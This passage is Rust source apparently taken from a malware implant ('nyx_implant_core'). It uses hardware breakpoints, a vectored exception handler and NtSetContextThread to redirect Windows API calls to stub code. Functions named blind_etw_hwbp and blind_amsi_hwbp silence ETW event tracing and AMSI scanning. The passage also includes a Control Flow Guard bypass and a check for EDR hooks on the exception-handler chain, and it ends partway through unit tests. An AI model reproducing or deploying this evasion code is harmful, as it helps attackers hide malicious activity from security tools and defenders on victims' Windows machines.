    unsafe extern "system" fn(
        usize,
        unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void,
> {
    let add_addr = match nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"AddVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
    }) {
        Some(a) => a,
        None => {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return None;
        }
    };
    Some(core::mem::transmute::<
        usize,
        unsafe extern "system" fn(
            usize,
            unsafe extern "system" fn(usize) -> i32,
        ) -> *mut core::ffi::c_void,
    >(add_addr))
}

/// Resolve RemoveVectoredExceptionHandler. On failure, marks the chain unsafe
/// (`VEH_SAFE = false`) and returns None — the caller reports the chain as
/// compromised.
unsafe fn resolve_remove_veh() -> Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32> {
    let rm_addr = match nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"RemoveVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
    }) {
        Some(a) => a,
        None => {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return None;
        }
    };
    Some(core::mem::transmute::<
        usize,
        unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
    >(rm_addr))
}

/// Register the transient probe handler at the front of the chain and remove
/// it immediately. Returns true if the chain appears compromised (either
/// call failed, e.g. an EDR hooking the VEH API or already occupying it).
unsafe fn probe_veh_chain(
    add: unsafe extern "system" fn(
        usize,
        unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void,
    rm: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
) -> bool {
    // Register probe at the front of the chain (First = 1).
    let handle = add(1, probe_veh_handler);
    if handle.is_null() {
        VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
        return true;
    }

    // Remove the probe immediately.
    if rm(handle) == 0 {
        VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
        return true;
    }

    false // chain appears clean
}
// ---- ADD / REMOVE --------------------------------------------------------

/// Write a u64 to the Context buffer at the given offset (via raw pointer).
unsafe fn ctx_write_u64_at(base: usize, off: usize, val: u64) {
    // SAFETY: caller guarantees base+off is a valid, writable address inside
    // a CONTEXT buffer. write_unaligned tolerates any alignment.
    core::ptr::write_unaligned((base + off) as *mut u64, val);
}

/// Write a u32 to the Context buffer at the given offset.
unsafe fn ctx_write_u32_at(base: usize, off: usize, val: u32) {
    // SAFETY: see ctx_write_u64_at.
    core::ptr::write_unaligned((base + off) as *mut u32, val);
}

/// Read a u64 from the Context buffer at the given offset.
unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
    // SAFETY: caller guarantees base+off is a valid readable u64 inside a
    // CONTEXT buffer. read_unaligned tolerates any alignment.
    core::ptr::read_unaligned((base + off) as *const u64)
}

/// Claim a vacant slot for arming. Returns the slot index on success, or an
/// error string if all four slots are already armed/in-use. Uses a CAS so two
/// concurrent armers never grab the same slot.
fn claim_slot() -> Result<usize, &'static str> {
    for (i, slot) in HWBP_SLOT_STATE.iter().enumerate() {
        if slot
            .compare_exchange(
                SLOT_VACANT,
                SLOT_CLAIMED,
                core::sync::atomic::Ordering::Acquire,
                core::sync::atomic::Ordering::Relaxed,
            )
            .is_ok()
        {
            return Ok(i);
        }
    }
    Err("all 4 DR slots full")
}

// Set a hardware breakpoint on `target_addr` using the given shadow type.
//
// Uses `NtGetContextThread` / `NtSetContextThread(NT_CURRENT_THREAD, ctx)`
// with `CONTEXT_DEBUG_REGISTERS` for the set call.
//
// Returns the DR slot index (0–3) on success.
//
// # Arming protocol (CRITICAL-6/7)
//
// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH handles a #DB on a
//    CLAIMED slot with a DR6 clear + Resume Flag (it is ours — the register
//    gets armed below — and must not be passed through unhandled).
// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
// 3. Register the VEH if not already registered (once, before any DR write).
// 4. Arm the DR register via NtSetContextThread.
// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
//    Release ordering. Only AFTER this point can the VEH redirect on the slot.
//
// The DR bit is set BEFORE the slot is published. If a #DB fires between
// arming and publishing, the VEH sees CLAIMED and handles it as a benign
// one-shot (clear DR6 + set RF, no redirect): the target instruction executes
// once, and the next execution re-traps — by then the slot is OCCUPIED and
// the VEH redirects. We never publish a slot whose DR bit isn't already set,
// so the VEH never observes an armed-but-unpublished slot as vacant.
// ── add_hwbp helpers ───────────────────────────────────────────────────────

/// NtGetContextThread / NtSetContextThread share this signature.
type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;

/// Resolve NtGetContextThread and NtSetContextThread.
unsafe fn resolve_nt_context_fns() -> Result<(FnCtx, FnCtx), &'static str> {
    let ntgct_addr =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
            Some(a) => a,
            None => return Err("NtGetContextThread unresolved"),
        };
    let ntsct_addr =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
            Some(a) => a,
            None => return Err("NtSetContextThread unresolved"),
        };
    Ok((
        core::mem::transmute::<usize, FnCtx>(ntgct_addr),
        core::mem::transmute::<usize, FnCtx>(ntsct_addr),
    ))
}

/// Register the VEH handler once. Returns an error if the chain is compromised
/// or AddVectoredExceptionHandler fails. Must be called BEFORE setting
/// breakpoints — the handler must be in place to catch #DB.
unsafe fn register_veh_once() -> Result<(), &'static str> {
    let veh_registered = !VEH_HANDLE
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null();
    if veh_registered {
        diag(b'e');
        return Ok(());
    }
    if !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
        diag(b'v');
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    if veh_chain_has_handlers() {
        diag(b'V');
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    diag(b'd');
    // CFG bypass: mark handler as valid indirect-call target.
    if crate::cfg_user::cfg_enabled() {
        crate::cfg_user::mark_addr_cfg_valid(hwbp_veh_handler as *const () as usize);
        let sb = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
        if !sb.is_null() {
            crate::cfg_user::mark_addr_cfg_valid(sb as usize);
        }
    }
    let addr = match nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"AddVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
    }) {
        Some(a) => a,
        None => return Err("AVEH unresolved"),
    };
    diag(b'x');
    type AddVEH = unsafe extern "system" fn(
        usize,
        unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void;
    let f: AddVEH = core::mem::transmute(addr);
    diag(b'y');
    let handle = f(1, hwbp_veh_handler);
    diag(b'z');
    if handle.is_null() {
        diag(b'E');
        return Err("AddVectoredExceptionHandler failed");
    }
    VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
    diag(b'e');
    Ok(())
}

/// Allocate a page-aligned CONTEXT buffer via VirtualAlloc and zero it.
unsafe fn alloc_ctx_buf() -> Result<usize, &'static str> {
    let va_addr = match nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => return Err("VirtualAlloc unresolved"),
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        return Err("VirtualAlloc for CONTEXT failed");
    }
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);
    Ok(ctx_buf as usize)
}

/// Capture current thread context, configure DRn for `target_addr` at `slot`,
/// set DR7 for an execute breakpoint, and apply via NtSetContextThread.
/// Frees `ctx_buf` on both success and failure paths.
unsafe fn configure_dr_slot(
    base: usize,
    slot: usize,
    target_addr: usize,
    ntgct: unsafe extern "system" fn(usize, usize) -> i32,
    ntsct: unsafe extern "system" fn(usize, usize) -> i32,
    ctx_buf: *mut core::ffi::c_void,
) -> Result<u64, &'static str> {
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_FULL_AMD64);
    diag(b'g');
    let st = ntgct(NT_CURRENT_THREAD, base);
    if st < 0 {
        free_ctx_buf(ctx_buf);
        diag(b'I');
        return Err("NtGetContextThread failed");
    }
    diag(b'h');

    let original_dr7 = ctx_read_u64_at(base, CTX_DR7);
    vehtag(b'O');

    // Set DRn = target_addr (DR0 at offset 0x048, then +8 per slot).
    ctx_write_u64_at(base, CTX_DR0 + slot * 8, target_addr as u64);
    ctx_write_u64_at(base, CTX_DR6, 0);

    // Configure DR7 for execute breakpoint: clear this slot's bits, set L.
    let mut new_dr7 = original_dr7;
    new_dr7 &= !(0x3u64 << (slot * 2)); // clear L + G
    new_dr7 &= !(0xFu64 << (16 + slot * 4)); // clear R/W + LEN
    new_dr7 |= 1u64 << (slot * 2); // set L (local enable)
    ctx_write_u64_at(base, CTX_DR7, new_dr7);
    diag(b'i');

    // Apply: write only debug registers via NtSetContextThread.
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
    let st2 = ntsct(NT_CURRENT_THREAD, base);
    free_ctx_buf(ctx_buf);
    if st2 < 0 {
        diag(b'K');
        return Err("NtSetContextThread failed");
    }
    diag(b'j');
    Ok(original_dr7)
}

// ── add_hwbp orchestrator ──────────────────────────────────────────────────

/// Arm a hardware breakpoint at `target_addr` on the current thread. The HWBP
/// fires once per execution of the target instruction (STATUS_SINGLE_STEP),
/// which the VEH handler catches and redirects to the shadow stub.
///
/// Returns the 0-based DR slot number (0–3) on success.
/// Returns `Err` if no free slot, the VEH chain is compromised, or any
/// NT API call fails. The caller must call [`remove_hwbp`] to disarm.
///
/// # Safety
/// Arms a DR debug register on the CURRENT thread via `NtSetContextThread`
/// and registers this module's VEH. Call only from the thread whose
/// execution of `target_addr` should be redirected (the beacon thread); the
/// shadow buffer must be initialized ([`init_shadow_buffer`]).
pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<usize, &'static str> {
    diag(b'a');

    // 0. Preconditions.
    let shadow = resolve_shadow_for_arm(shadow_type)?;
    diag(b'b');

    // 1. Claim a free HWBP slot.
    let slot = claim_hwbp_slot()?;
    diag(b'c');

    // 2. Resolve NT context functions.
    let (ntgct, ntsct) = match resolve_nt_context_fns() {
        Ok(f) => f,
        Err(e) => {
            let tag = if e.contains("Get") { b'H' } else { b'J' };
            return release_slot(slot, tag, e);
        }
    };

    // 3. Register VEH once (must be before breakpoints).
    if let Err(e) = register_veh_once() {
        return release_slot(slot, b'D', e);
    }

    // 4–6. Allocate the CONTEXT buffer, configure the DR register, and
    // publish the armed entry.
    match arm_and_publish_slot(slot, target_addr, shadow, ntgct, ntsct) {
        Ok(()) => {
            diag(b'k');
            Ok(slot)
        }
        Err((tag, e)) => release_slot(slot, tag, e),
    }
}

/// Resolve the shadow stub address for arming, tagging the diag stream
/// (b'1' = shadow buffer not initialized, b'2' = invalid shadow type).
unsafe fn resolve_shadow_for_arm(shadow_type: ShadowType) -> Result<usize, &'static str> {
    if SHADOW_BUF
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null()
    {
        diag(b'1');
        return Err("shadow buffer not initialized");
    }
    match shadow_addr(shadow_type) {
        Some(s) => Ok(s),
        None => {
            diag(b'2');
            Err("invalid shadow type")
        }
    }
}

/// Claim a free HWBP slot, tagging exhaustion with b'3' on the diag stream.
unsafe fn claim_hwbp_slot() -> Result<usize, &'static str> {
    match claim_slot() {
        Ok(s) => Ok(s),
        Err(e) => {
            diag(b'3');
            Err(e)
        }
    }
}

/// Release a claimed slot back to VACANT on an early-exit error path.
unsafe fn release_slot(slot: usize, tag: u8, err: &'static str) -> Result<usize, &'static str> {
    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
    diag(tag);
    Err(err)
}

/// Allocate a CONTEXT buffer, configure the DR register for an execute
/// breakpoint, and publish the armed entry (write pool cell, flip
/// CLAIMED→OCCUPIED, bump the live count). Returns Err((diag_tag, msg)).
unsafe fn arm_and_publish_slot(
    slot: usize,
    target_addr: usize,
    shadow: usize,
    ntgct: unsafe extern "system" fn(usize, usize) -> i32,
    ntsct: unsafe extern "system" fn(usize, usize) -> i32,
) -> Result<(), (u8, &'static str)> {
    // 4. Allocate CONTEXT buffer.
    let base = match alloc_ctx_buf() {
        Ok(b) => b,
        Err(e) => return Err((b'F', e)),
    };
    let ctx_buf = base as *mut core::ffi::c_void;
    diag(b'f');

    // 5. Configure DR registers for the execute breakpoint.
    let original_dr7 = match configure_dr_slot(base, slot, target_addr, ntgct, ntsct, ctx_buf) {
        Ok(dr7) => dr7,
        Err(e) => return Err((b'K', e)),
    };

    // 6. Publish the armed entry: write pool cell, then flip CLAIMED→OCCUPIED.
    let cell_ptr: *mut HwbpEntry = HWBP_POOL[slot].get();
    core::ptr::write(
        cell_ptr,
        HwbpEntry {
            target: target_addr,
            shadow,
            original_dr7,
        },
    );
    HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
    HWBP_COUNT.fetch_add(1, core::sync::atomic::Ordering::Release);
    Ok(())
}

/// Remove a hardware breakpoint and restore the original DR7.
///
/// # Disarming protocol (CRITICAL-6/7 + disarm-before-vacant ordering)
///
/// 1. Atomically claim the slot OCCUPIED→CLAIMED via CAS. The VEH treats a
///    CLAIMED slot's #DB as ours and handles it with a DR6 clear + Resume
///    Flag (no redirect — see `hwbp_veh_handler`), so a trap landing in the
///    disarm window is never passed through unhandled.
/// 2. Read out the saved entry (documents cell ownership).
/// 3. **Disarm the DR register** via NtSetContextThread (clear DRx, DR6, and
///    this slot's L/G/RW/LEN bits in DR7). Only a fully-disarmed slot is
///    published VACANT — a vacant slot must never carry an armed DR register:
///    the old VACANT-before-disarm order left a window where a #DB could fire
///    for a slot the VEH treats as vacant (SEARCH → unhandled → process
///    death), and a concurrent add_hwbp could reclaim the slot and have its
///    fresh arming clobbered by the still-pending disarm. If any step of the
///    disarm fails, the slot is restored to OCCUPIED (the breakpoint is still
///    armed and the VEH keeps redirecting) and an error is returned — the
///    caller knows nothing was removed.
/// 4. Decrement the live count and publish VACANT (Release) so a future
///    add_hwbp can reclaim the slot. From here on no new #DB can fire from
///    this slot on this thread.
/// 5. If the live count reached zero, remove the VEH handler.
///
/// Because the beacon thread is the sole faulting thread for local-enable
/// HWBPs, and `remove_hwbp` runs on the beacon thread, there is no window
/// where this thread is both executing the target address and inside
/// `remove_hwbp`. The CAS + disarm-first sequence makes the teardown safe
/// even if that assumption is ever violated by a global-enable (G bit)
/// breakpoint.
///
/// # Safety
/// Writes the DR debug registers of the CURRENT thread via
/// `NtSetContextThread`. Call only from the thread that armed `slot`
/// (the beacon thread); `slot` must have been returned by [`add_hwbp`].
pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
    if slot >= 4 {
        return Err("invalid slot");
    }
    // Atomically claim the slot for teardown: OCCUPIED→CLAIMED. A failed
    // CAS means the slot wasn't armed (or another remover raced us).
    if !claim_slot_for_disarm(slot) {
        return Err("invalid slot");
    }

    // Read out the saved entry. The read documents that the cell is now ours;
    // original_dr7 is applied implicitly via DR7 bit-clearing below.
    // SAFETY: slot is CLAIMED (we just won the CAS), so we are the sole
    // accessor of this cell.
    let _entry: HwbpEntry = core::ptr::read(HWBP_POOL[slot].get());

    // Allocate CONTEXT buffer.
    let ctx_buf = match alloc_disarm_ctx_buf() {
        Ok(b) => b,
        Err((tag, err)) => return rollback_slot_disarm(slot, tag, err),
    };
    let base = ctx_buf as usize;
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);

    // Resolve NtGetContextThread/NtSetContextThread (free the buffer on failure).
    let (ntgct, ntsct) = match resolve_disarm_ctx_fns() {
        Ok(f) => f,
        Err((tag, err)) => {
            free_ctx_buf(ctx_buf);
            return rollback_slot_disarm(slot, tag, err);
        }
    };

    // Disarm the slot's DR register; only a successful disarm publishes VACANT.
    let disarmed = disarm_dr_register(base, slot, ntgct, ntsct);

    free_ctx_buf(ctx_buf);
    if !disarmed {
        // Disarm failed — the breakpoint may still be armed; restore OCCUPIED.
        return rollback_slot_disarm(slot, b'D', "disarm failed");
    }

    // Disarmed. Now the slot is safe to hand back to the pool.
    publish_slot_vacant(slot);

    // Remove VEH when no more breakpoints are active.
    maybe_remove_veh();
    Ok(())
}

/// Atomically claim the slot for teardown: OCCUPIED→CLAIMED. Returns false
/// if the CAS fails (the slot wasn't armed, or another remover raced us) —
/// the caller treats that as "invalid slot".
fn claim_slot_for_disarm(slot: usize) -> bool {
    let prev = HWBP_SLOT_STATE[slot].compare_exchange(
        SLOT_OCCUPIED,
        SLOT_CLAIMED,
        core::sync::atomic::Ordering::Acquire,
        core::sync::atomic::Ordering::Relaxed,
    );
    prev.is_ok()
}

/// Roll back a failed disarm: keep the slot OCCUPIED (the breakpoint is
/// still armed and the VEH keeps redirecting) and report the failure,
/// instead of leaving a VACANT slot with a live DR register (the
/// disarm-before-vacant invariant).
unsafe fn rollback_slot_disarm(
    slot: usize,
    tag: u8,
    err: &'static str,
) -> Result<(), &'static str> {
    HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
    diag(tag);
    Err(err)
}

/// Allocate a zeroed 1232-byte CONTEXT buffer for disarming. Returns
/// Err((diag_tag, msg)) on failure.
unsafe fn alloc_disarm_ctx_buf() -> Result<*mut core::ffi::c_void, (u8, &'static str)> {
    let va_addr = match nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => return Err((b'V', "VirtualAlloc unresolved")),
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        return Err((b'F', "VirtualAlloc for CONTEXT failed"));
    }
    // SAFETY: freshly-allocated 1232-byte RW buffer we own.
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);
    Ok(ctx_buf)
}

/// Resolve NtGetContextThread / NtSetContextThread for disarming. Returns
/// Err((diag_tag, msg)) on failure.
unsafe fn resolve_disarm_ctx_fns() -> Result<(FnCtx, FnCtx), (u8, &'static str)> {
    let ntgct: FnCtx =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
            Some(a) => core::mem::transmute::<usize, FnCtx>(a),
            None => return Err((b'G', "NtGetContextThread unresolved")),
        };
    let ntsct: FnCtx =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
            Some(a) => core::mem::transmute::<usize, FnCtx>(a),
            None => return Err((b'S', "NtSetContextThread unresolved")),
        };
    Ok((ntgct, ntsct))
}

/// Disarm the slot's DR register: clear the slot-specific DRx register + DR6
/// and clear only this slot's bits in DR7 — restoring the full original_dr7
/// is unsafe when other slots are active (it would clobber their L/RW/LEN
/// bits) — then apply via NtSetContextThread. Returns true on success.
unsafe fn disarm_dr_register(
    base: usize,
    slot: usize,
    ntgct: unsafe extern "system" fn(usize, usize) -> i32,
    ntsct: unsafe extern "system" fn(usize, usize) -> i32,
) -> bool {
    if ntgct(NT_CURRENT_THREAD, base) >= 0 {
        ctx_write_u64_at(base, CTX_DR0 + slot * 8, 0);
        ctx_write_u64_at(base, CTX_DR6, 0);
        let cur_dr7 = ctx_read_u64_at(base, CTX_DR7);
        let mut dr7 = cur_dr7;
        // Clear L and G for this slot
        dr7 &= !(0x3u64 << (slot * 2));
        // Clear R/W and LEN for this slot
        dr7 &= !(0xFu64 << (16 + slot * 4));
        ctx_write_u64_at(base, CTX_DR7, dr7);
        ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
        ntsct(NT_CURRENT_THREAD, base) >= 0
    } else {
        false
    }
}

/// Publish the disarmed slot back to VACANT: decrement the live count and
/// store SLOT_VACANT (Release) so a future add_hwbp can reclaim it and the
/// VEH treats it as foreign. From here on no new #DB can fire from this
/// slot on this thread.
fn publish_slot_vacant(slot: usize) {
    HWBP_COUNT.fetch_sub(1, core::sync::atomic::Ordering::Release);
    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
}

/// If the live breakpoint count reached zero, remove the VEH handler. Loads
/// the count with Acquire (paired with the fetch_sub Release above); if
/// zero, swaps the handle out (AcqRel) and calls
/// RemoveVectoredExceptionHandler. The swap prevents double-removal by
/// concurrent callers.
unsafe fn maybe_remove_veh() {
    if HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire) == 0 {
        let handle = VEH_HANDLE.swap(core::ptr::null_mut(), core::sync::atomic::Ordering::AcqRel);
        if !handle.is_null() {
            if let Some(a) = nyx_implant_core::resolve::export_addr(
                b"kernelbase.dll",
                b"RemoveVectoredExceptionHandler",
            )
            .or_else(|| {
                nyx_implant_core::resolve::export_addr(
                    b"kernel32.dll",
                    b"RemoveVectoredExceptionHandler",
                )
            }) {
                type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
                let f: RemoveVEH = core::mem::transmute(a);
                f(handle);
            } else {
                // Could not resolve the remover — put the handle back so a
                // future remove_hwbp can retry. (The VEH stays registered,
                // which is harmless: it does nothing for vacant slots.)
                VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
            }
        }
    }
}

/// Free a VirtualAlloc'd context buffer.
unsafe fn free_ctx_buf(buf: *mut core::ffi::c_void) {
    if let Some(vf_addr) = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualFree")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualFree"))
    {
        type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
        let vff: VFree = core::mem::transmute(vf_addr);
        // SAFETY: buf was returned by VirtualAlloc with MEM_RESERVE|COMMIT;
        // MEM_RELEASE (0x8000) with size 0 frees the entire region.
        vff(buf, 0, 0x8000); // MEM_RELEASE
    }
}

pub fn active_count() -> usize {
    HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire)
}

pub fn is_ready() -> bool {
    !SHADOW_BUF
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null()
}

/// Returns true if the VEH chain was found clean during probe.
/// Implant SHOULD check this before relying on HWBP-based patches;
/// if false, fall back to byte-patch mode.
pub fn is_veh_safe() -> bool {
    VEH_SAFE.load(core::sync::atomic::Ordering::Acquire)
}

/// Set HWBP on `ntdll!NtTraceEvent` → shadow returns 0 (ETW suppressed).
///
/// # Safety
/// Arms an execute HWBP on the current thread — see [`add_hwbp`].
pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
    let addr = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
        .ok_or("NtTraceEvent unresolved")?;
    add_hwbp(addr, ShadowType::EtwEaxZero)
}

/// Set HWBP on `amsi!AmsiScanBuffer` → shadow returns E_INVALIDARG (AMSI suppressed).
///
/// # Safety
/// Arms an execute HWBP on the current thread — see [`add_hwbp`].
pub unsafe fn blind_amsi_hwbp() -> Result<usize, &'static str> {
    let addr = nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer")
        .ok_or("amsi not loaded")?;
    add_hwbp(addr, ShadowType::AmsiInvalidArg)
}

// NOTE: these tests mutate the global slot pool / states; run with
// `--test-threads=1` (the HWBP subsystem they model is single-threaded too).
#[cfg(test)]
mod tests {
    use super::*;
    use core::sync::atomic::Ordering;

    fn wr_u64(buf: &mut [u8], off: usize, v: u64) {
        buf[off..off + 8].copy_from_slice(&v.to_le_bytes());
    }
    fn wr_u32(buf: &mut [u8], off: usize, v: u32) {
        buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
    }
    fn rd_u64(buf: &[u8], off: usize) -> u64 {
        u64::from_le_bytes(buf[off..off + 8].try_into().unwrap())
    }
    fn rd_u32(buf: &[u8], off: usize) -> u32 {
        u32::from_le_bytes(buf[off..off + 4].try_into().unwrap())
    }

    /// Raw CONTEXT read/write helpers round-trip at the documented offsets,
    /// tolerating unaligned access.
    #[test]
    fn ctx_read_write_round_trip() {
        let mut buf = [0u8; 1232];
        let base = buf.as_mut_ptr() as usize;
        unsafe {
            ctx_write_u64_at(base, CTX_DR6, 0xDEAD_BEEF);
            assert_eq!(ctx_read_u64_at(base, CTX_DR6), 0xDEAD_BEEF);
            ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, 0x1000_1F);
            assert_eq!(rd_u32(&buf, CTX_CONTEXT_FLAGS), 0x1000_1F);
            // Unaligned offset must not fault (write_unaligned/read_unaligned).
            ctx_write_u64_at(base, 3, 0xAB);
            assert_eq!(ctx_read_u64_at(base, 3), 0xAB);
        }
    }

    /// The VEH's exception triage: STATUS_SINGLE_STEP + DR6 B-bits yields
    /// (slot_bits, rip, fault_addr); wrong code or no B-bits passes through.
    #[test]
    fn veh_check_single_step_triage() {
        let mut exr = [0u8; 0x20];
        let mut ctx = [0u8; 1232];
        wr_u32(&mut exr, 0, STATUS_SINGLE_STEP as u32);
        wr_u64(&mut exr, 0x10, 0x1234_5678); // ExceptionAddress
        wr_u64(&mut ctx, CTX_DR6, 0x5); // B0 + B2
        wr_u64(&mut ctx, CTX_RIP, 0x4141_4141);
        let got = unsafe { veh_check_single_step(exr.as_ptr(), ctx.as_mut_ptr()) };
        assert_eq!(got, Some((0x5, 0x4141_4141, 0x1234_5678)));

        // Not a single-step exception → pass through.
        wr_u32(&mut exr, 0, 0xC000_0005u32); // ACCESS_VIOLATION
        assert_eq!(
            unsafe { veh_check_single_step(exr.as_ptr(), ctx.as_mut_ptr()) },
            None
        );

        // Single-step but no B0-B3 bits (TF trap) → pass through.
        wr_u32(&mut exr, 0, STATUS_SINGLE_STEP as u32);
        wr_u64(&mut ctx, CTX_DR6, 1 << 14); // BS only
        assert_eq!(
            unsafe { veh_check_single_step(exr.as_ptr(), ctx.as_mut_ptr()) },
            None
        );
    }

    /// Resume fixup: DR6 cleared, RF set, ContextFlags gains DEBUG_REGISTERS
    /// | CONTROL — leaving the pre-existing flags intact.
    #[test]
    fn veh_clear_dr6_set_rf_fixup() {
        let mut ctx = [0u8; 1232];
        wr_u64(&mut ctx, CTX_DR6, 0xFFFF_FFFF);
        wr_u32(&mut ctx, CTX_EFLAGS, 0x202);
        wr_u32(&mut ctx, CTX_CONTEXT_FLAGS, 0x10_0000);
        unsafe { veh_clear_dr6_set_rf(ctx.as_mut_ptr()) };
        assert_eq!(rd_u64(&ctx, CTX_DR6), 0);
        assert_eq!(rd_u32(&ctx, CTX_EFLAGS), 0x202 | RF_BIT);
        assert_eq!(
            rd_u32(&ctx, CTX_CONTEXT_FLAGS),
            0x10_0000 | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL
        );
    }

    /// Slot scan on a fabricated OCCUPIED slot: fault at the target redirects
    /// RIP to the shadow; a foreign address or a VACANT slot does not.
    #[test]
    fn veh_scan_slots_redirect_and_foreign() {
        unsafe {
            core::ptr::write_volatile(
                HWBP_POOL[0].get(),
                HwbpEntry {
                    target: 0x1000,
                    shadow: 0x2000,
                    original_dr7: 0,
                },
            );
            HWBP_SLOT_STATE[0].store(SLOT_OCCUPIED, Ordering::Release);
        }
        let mut ctx = [0u8; 1232];
        // Hit via fault_addr.
        wr_u64(&mut ctx, CTX_DR6, 1);
        wr_u64(&mut ctx, CTX_RIP, 0x9999);
        assert!(unsafe { veh_scan_slots(1, 0x9999, 0x1000, ctx.as_mut_ptr()) });
        assert_eq!(rd_u64(&ctx, CTX_RIP), 0x2000, "RIP must redirect to shadow");
        assert_eq!(rd_u64(&ctx, CTX_DR6), 0);
        assert_ne!(rd_u32(&ctx, CTX_EFLAGS) & RF_BIT, 0);

        // Hit via RIP equality (fallback match).
        let mut ctx2 = [0u8; 1232];
        assert!(unsafe { veh_scan_slots(1, 0x1000, 0x5555, ctx2.as_mut_ptr()) });
        assert_eq!(rd_u64(&ctx2, CTX_RIP), 0x2000);

        // Foreign address: no redirect.
        let mut ctx3 = [0u8; 1232];
        assert!(!unsafe { veh_scan_slots(1, 0x6666, 0x7777, ctx3.as_mut_ptr()) });
        assert_eq!(rd_u64(&ctx3, CTX_RIP), 0);

        // VACANT slot with a stale B-bit: foreign, not ours.
        HWBP_SLOT_STATE[0].store(SLOT_VACANT, Ordering::Release);
        let mut ctx4 = [0u8; 1232];
        assert!(!unsafe { veh_scan_slots(1, 0x9999, 0x1000, ctx4.as_mut_ptr()) });
    }

    /// A #DB on a CLAIMED (mid-arm/disarm) slot is handled as a benign
    /// one-shot: DR6 clear + RF set, but NO RIP redirect (the slot is not
    /// yet/anymore published).
    #[test]
    fn veh_scan_slots_claimed_is_benign_one_shot() {
        HWBP_SLOT_STATE[1].store(SLOT_CLAIMED, Ordering::Release);
        let mut ctx = [0u8; 1232];
        wr_u64(&mut ctx, CTX_DR6, 2);
